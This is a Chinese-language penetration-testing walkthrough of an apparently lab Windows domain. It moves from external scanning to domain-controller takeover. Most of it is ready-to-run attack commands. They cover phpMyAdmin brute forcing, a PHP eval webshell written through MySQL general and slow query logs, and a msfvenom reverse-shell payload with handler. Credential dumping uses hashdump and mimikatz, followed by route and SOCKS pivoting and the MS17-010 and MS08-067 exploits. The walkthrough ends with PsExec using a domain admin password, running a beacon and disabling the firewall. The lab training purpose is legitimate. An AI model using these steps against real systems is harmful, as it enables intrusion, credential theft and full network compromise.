# 1.环境搭建

### 1.1. 虚拟机网卡

### 1.2.拓扑图

![image](https://image.3001.net/images/20220721/1658369589_62d8b6355173b93a77c02.png!small)

### 1.3 环境

之前用的手机热点是43网段

  
|  
|  
  
---|---|---  
公网(cs服务器，攻击机)| 39.xxx|  
  
kali(cs客户端)| 192.168.1.16|  
  
win7（web服务器，域成员）| 192.168.1.24| 192.168.22.130  
win2003(域成员)|  
| 192.168.22.131  
win2008（域控）|  
| 192.168.22.132  
  
# 2\. 外网打点

### 2.1 信息收集

2.1.1 探测内网存活

    
    
    netdiscover -i eth0 -r 192.168.1.0/24
    

![image](https://image.3001.net/images/20220721/1658370123_62d8b84b690751d8be1fb.png!small)  
![image](https://image.3001.net/images/20220721/1658370482_62d8b9b2973691269b7d0.png!small)

2.1.2 端口扫描

#### 1.masscan

    
    
    masscan 192.168.1.24 -p 1-65535 --rate=1000
    

![image](https://image.3001.net/images/20220721/1658370342_62d8b9262be66091ebc81.png!small)

#### 2\. nmap

    
    
    nmap -sC -sV -p 80,3306 192.168.1.24
    
    nmap -sT -Pn -p- -A -n 192.168.1.24
    

> 开启 80 和3306,可以看到 是phpstudy 搭建的

2.1.3 访问80端口

![image](https://image.3001.net/images/20220721/1658370595_62d8ba237a8bd09b6fb4f.png!small)

2.1.4 目录爆破

#### 1\. dirserch

    
    
    python.exe dirsearch.py -u http://192.168.1.24/  -e *
    
    -u：url
    
    -e：-e EXTENSIONS, --extensions=EXTENSIONS。扩展名列表用逗号隔开(例如：php,asp)
    
    其他：-l   =urllist.txt（里面存放着所有需要扫描的目录）
    

![image](https://image.3001.net/images/20220721/1658370817_62d8bb014ff830d3eab60.png!small)

#### 2.御剑

![image](https://image.3001.net/images/20220721/1658370831_62d8bb0f92e8eb233a820.png!small)

>  **扫出phpmyadmin 页面**

2.1.5 分析收集的信息

`mysql不允许外连`  
`beifen.rar为源码备份压缩包，可以选择搭建环境配合代码审计挖掘漏洞`  
`phpinfo泄露`  
`存在数据库管理工具phpmyadmin，可以通过爆破进后台或者查找历史漏洞`

### 2.2 phpmyadmin漏洞利用

![image](https://image.3001.net/images/20220721/1658371227_62d8bc9bbd57343ddb022.png!small)

2.2.1 密码爆破

![image](https://image.3001.net/images/20220721/1658371213_62d8bc8de8aae5a46a61a.png!small)

2.2.2 into写入文件

    
    
    mysql  into写入文件：使用需看要secure_file_priv的值。
    	value为“null”时，不允许读取任意文件
    	value为其余路径时，表示该路径可以读写文件
    	value为“空”时，允许读取任意文件
    
    用show global variables like '%secure%' 命令查看
    

要想修改 Value值 只能通过配置文件 mysql.ini 修改,所以暂时不考虑

2.2.3 日志写入木马getshell

#### 1.global日志写入

    
    
    1.查看日志功能是否开启
    show global variables like '%general%'
    2.未开启的话设置为 on
    set global general_log='ON'
    3.开启后将日志文件的存储位置改为可访问到的目录， 根目录即可
    set global  general_log_file = 'C:/phpStudy1/WWW/2.php'
    4.执行下边一句话木马 
    数据库将会将查询语句保存在日志文件中
    SELECT '<?php @eval($_POST["pass"]); ?>'
    5.写入成功后 使用蚁剑连接
    

#### 2\. 慢日志写入

>
> 一般都是通过long_query_time选项来设置这个时间值，时间以秒为单位，可以精确到微秒。如果查询时间超过了这个时间值（默认为10秒），这个查询语句将被记录到慢查询日志中。查看服务器默认时间值方式如下：
> **当查询语句执行的时间要超过系统默认的时间时,该语句才会被记入进慢查询日志**
    
    
    1.查看日志功能是否开启
    show global variables like '%long_query_time%'
    2.未开启的话设置为 on
    set global slow_query_log='ON'
    3.开启后将日志文件的存储位置改为可访问到的目录， 根目录即可
    set global  slow_query_log_file = 'C:/phpStudy1/WWW/2.php'
    4.执行下边一句话木马 
    数据库将会将查询语句保存在日志文件中
    SELECT '<?php @eval($_POST["pass"]); ?>' or sleep(11)
    5.写入成功后 使用蚁剑连接
    

## 3.拿下webshell后信息收集

    
    
    判断方法
    1.whoami hostname   对比
    2.ipconfig /all 看DNS
    3.systeminfo  看是否有域一栏
    
    1.ipconfig 看所处网段是否有多个
    2.netstat -ano 查看网络连接和开放端口
    3.net start  查看启动的服务  用于提权
    4.tasklist   查看开启的进程
    5.tasklist /SVC 复制到在线杀软识别 看存在的杀软情况  https://i.hacking8.com/tiquan
    6. ping baidu  看是否可以出网等 
    7. net user   存在用户
    
    1.net user /domain  # 查看当前网络域环境，查询有几个域
    2.net view  # 查询同域机器
    3.net user /domain # 查询域用户列表
    4.net group "Domain controllers" /domain  # 查询域控制器
    5.net group "domain admins" /domain  # 查看域管理员
    

存在域，后面我们要域渗透

> 分析

`存在其他内网网段192.168.22.xx`  
`存在域god.org，域控主机为owa.god.org（192.168.22.132）`  
`当前用户为域成员`  
`不存在杀软`  
`可出网，没有限制`  
`补丁较少`

# 4.后渗透

### 4.1 上线msf

    
    
    生成exe木马
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.16 LPORT=2333 -f exe >
    hack.exe 
    开启监听
    
    msfconsole
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 2333
    set lhost 192.168.1.16
    exploit -j
    
    或 handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.1.16 -P 2333
    

将生成的exe木马通过蚁剑上传到 目标服务器的`c:window/temp`执行上线成功`可输入 ？查看 可执行的命令`

### 4.2 msf信息收集

    
    
    1.msf arp 发现主机  开机状态下才可探测出 
    	run arp_scanner -r  192.168.22.0/24
    	
    2.run post/multi/recon/local_exploit_suggester      查看msf的提权
    

![image](https://image.3001.net/images/20220723/1658582099_62dbf453c71b4b67070e1.png!small)

### 4.3 提权

    
    
    1.msf本身提权
        getuid查看服务器权限
        getsystem 提权
        getuid 查看是否提权成功
    
    2.使用其他方法
    

### 4.4 获取域用户密码信息

1\. hashdump

    
    
    1.导入账号，密码hash值
        run hashdump 
    
        Windows系统下的hash密码格式为：
        用户名称:RID:LM-HASH值:NT-HASH值
        NT-HASH hash生产方式：
    
        1. 将明文口令转换成十六进制的格式 
        2. 转换成Unicode格式，即在每个字节之后添加0x00
        3. 对Unicode字符串作MD4加密，生成32位的十六进制数字串
    

![image](https://image.3001.net/images/20220723/1658584349_62dbfd1d0e128a4c056bc.png!small)

2\. mimikatz

加载 mimikatz 模块，加载模块前需要先将meterpreter迁移到64位的进程，该进程也需要是system权限：

    
    
    ps
    migrate PID
    load mimikatz
    mimikatz_command -f sekurlsa::searchPasswords
    

![image](https://image.3001.net/images/20220723/1658584376_62dbfd3832d0770a5d5a6.png!small)

3.kiwi

    
    
    load wiki
    creds_all
    

![image](https://image.3001.net/images/20220723/1658584401_62dbfd51441ae7b3dab11.png!small)

### 4.5 3389连接

1.探测3389端口

    
    
    nmap -p 3389 192.168.1.24
    

![image](https://image.3001.net/images/20220723/1658582160_62dbf49005434d1c280e0.png!small)

2.连接3389

    
    
    run post/windows/manage/enable_rdp
    

### 4.6 msf联动cs

    
    
    use exploit/windows/local/payload_inject
    set payload windows/meterpreter/reverse_http
    set DisablePayloadHandler true   #payload_inject执行之后会在本地产生一个新的handler，设置为true表示不重复生成
    set lhost xxxx                 #公网vps ip
    set lport 14444                 #监听端口 
    set session 1                   #派发session id
    exploit
    

这里cs配置了cdn，自己玩可以不用

![image](https://image.3001.net/images/20220723/1658582192_62dbf4b03281bb78a6756.png!small)  
![image](https://image.3001.net/images/20220723/1658582215_62dbf4c7a5800538e62da.png!small)

![image](https://image.3001.net/images/20220723/1658582241_62dbf4e19a3977d17d0cd.png!small)

## 5.跨网段横向渗透

### 5.1 搭建隧道

`横向渗透前，先将该web服务器配置为代理服务器当作跳板机。`

1.msf+socks_proxy+ proxychains 穿透内网

#### msf路由

    
    
    进入metepreter，添加路由
    1. run autoroute -s 192.168.52.0/24		添加路由
    2. run autorout -p       查看是否添加成功 
    3. background           返回
    4. route print			输出路由
    

#### 配置msf socks代理

    
    
    5. use auxiliary/server/socks_proxy		使用 socks4a模块
    6. set srvport 1080		设置端口1080
    7. run		运行
    

![image](https://image.3001.net/images/20220723/1658582317_62dbf52dc1b01bdbd94e0.png!small)

#### 配置kali socks代理

    
    
    配置proxychains
        vim /etc/proxychains4.conf 
    
        socks5 127.0.0.1 1080
    

![image](https://image.3001.net/images/20220723/1658582340_62dbf54467a3daa5360d6.png!small)

#### 测试代理

    
    
    proxychains curl 192.168.22.130 --head
    

![image](https://image.3001.net/images/20220723/1658582358_62dbf55683351eee489b4.png!small)

2.cobaltstrike + proxifer

#### cs开启socks代理

![image](https://image.3001.net/images/20220723/1658582383_62dbf56fac88244865f80.png!small)

自定义端口

    
    
    socks 9999
    

#### proxifer socks代理

![image](https://image.3001.net/images/20220723/1658582499_62dbf5e311c8bb03e6a50.png!small)

### 5.2 内网信息收集

之前msf 配置了socks代理

使用msf内置模块进行存活主机探测

    
    
    auxiliary/scanner/discovery/udp_sweep    #基于udp协议发现内网存活主机
    auxiliary/scanner/discovery/udp_probe    #基于udp协议发现内网存活主机
    auxiliary/scanner/netbios/nbname         #基于netbios协议发现内网存活主机
    

内网主机端口扫描

    
    
    proxychains nmap -Pn -sT 192.168.22.131  内网不出网，绕ping扫描
    
    use auxiliary/scanner/portscan/tcp           #基于tcp进行端口扫描(默认扫描1-10000)
    

![image](https://image.3001.net/images/20220723/1658582612_62dbf6542dfacfd261872.png!small)

内网主机服务探测

    
    
    auxiliary/scanner/ftp/ftp_version            #发现内网ftp服务，基于默认21端口
    auxiliary/scanner/ssh/ssh_version            #发现内网ssh服务，基于默认22端口
    auxiliary/scanner/telnet/telnet_version      #发现内网telnet服务，基于默认23端口
    auxiliary/scanner/dns/dns_amp                #发现dns服务，基于默认53端口
    auxiliary/scanner/http/http_version          #发现内网http服务，基于默认80端口
    auxiliary/scanner/http/title                 #探测内网http服务的标题
    auxiliary/scanner/smb/smb_version            #发现内网smb服务，基于默认的445端口
    auxiliary/scanner/mssql/mssql_schemadump     #发现内网SQLServer服务,基于默认的1433端口
    auxiliary/scanner/oracle/oracle_hashdump     #发现内网oracle服务,基于默认的1521端口 
    auxiliary/scanner/mysql/mysql_version        #发现内网mysql服务，基于默认3306端口
    auxiliary/scanner/rdp/rdp_scanner            #发现内网RDP服务，基于默认3389端口
    auxiliary/scanner/redis/redis_server         #发现内网Redis服务，基于默认6379端口
    auxiliary/scanner/db2/db2_version            #探测内网的db2服务，基于默认的50000端口
    auxiliary/scanner/netbios/nbname             #探测内网主机的netbios名字
    

### 5.3 横向渗透控制域内其他机器

### 1\. 拿下域成员

可尝试MS17-010(445）和 MS19-0708(3389)，MS08-067，直接search找exp

MS17-010(445）

打之前先探测一波

    
    
    search type:auxiliary name:067
    use auxiliary/scanner/smb/smb_ms17_010
    set rhost 192.168.22.131
    run
    
    search type:exploit name:010
    use exploit/windows/smb/ms17_010_eternalblue
    set rhost 192.168.22.131
    set payload windows/meterpreter/bind_tcp
    

MS08-067 漏洞将会影响除Windows Server 2008 Core以下的所有Windows系统，包括：Windows
2000/XP/Server 2003/Vista/Server 2008的各个版本，甚至还包括测试阶段的Windows 7 Pro-Beta

    
    
    use exploit/windows/smb/ms08_067_netapi
    set rhost 192.168.22.131
    set payload windows/meterpreter/bind_tcp #不出网，使用正向代理
    run
    

2\. 拿下域控

#### psexec攻击

内网中，最总要的还是域管理员账号，有了域管理员账号后，可以使用该域管理员账号密码利用 psexec 登录域内任何一台开启了admin$共享(该共享默认开启)
的主机

下载地址

https://download.sysinternals.com/files/PSTools.zip

命令参考  
https://www.cnblogs.com/wuyuan2011woaini/p/9561122.html

    
    
    Psexec针对远程建立连接的方式有两种，一种先建立IPC通道连接，然后直接使用，操作如下：
    net use \\192.168.22.132\ipc$ “password” /user:administrator
    psexec.exe \\192.168.22.132 cmd                   进入半交互式cmdshell  ；
    
    另一种时在psexec的参数中指定账户密码    操作如下：
    psexec.exe \\192.168.22.132 –u administrator –p password
    

通过蚁剑上传psexec64.exe 到web服务器

    
    
    生成木马
    msf  -> msfvemon ->  beacon.exe
    cs   beacon.exe
    
    1.#上传木马文件
    PsExec64.exe -accepteula \\192.168.22.132 -u god\administrator -p hongrisec@20191 -d -c C:\windows\temp\beacon.exe
    

msf拿下域控

    
    
    2.#打开 域控cmd  并执行 上线
    PsExec64.exe -accepteula \\192.168.22.132 -u god\administrator -p hongrisec@20191 -s cmd
    PsExec.exe -accepteula \\192.168.22.132 -u god\administrator -p hongrisec@20191 -s cmd
    
    cd..                        #返回到上级 c:/windows目录
    dir | findstr beacon		#看是否上传beacon32.exe成功
    beacon.exe				#执行
    

cs拿下域控

    
    
    2.#打开 域控cmd  并执行 上线
    shell 
    PsExec64.exe -accepteula \\192.168.22.132 -u god\administrator -p hongrisec@20191 -s cmd
    cd..                        #返回到上级 c:/windows目录
    dir | findstr beacon		#看是否上传beacon.exe成功
    beacon.exe				#执行
    

注意

    
    
    1.可以web服务器关闭防火墙
        NetSh Advfirewall set allprofiles state off  #关闭防火墙
        Netsh Advfirewall show allprofiles            #查看防火墙状态
    
    2.域控服务器执行exe后，反向链接kali192.168.1.16 的监听端口 
    
    3. web服务器 防火墙处于开启状态，可以放开监听端口 在运行看是否上线成功
        web服务器输入以下命令开启 或者手动开启
        netsh advfirewall firewall add rule name="beacon" dir=in protocol=tcp localport=端口 action=allow
    

![image](https://image.3001.net/images/20220723/1658582629_62dbf66596e14f6f00e36.png!small)

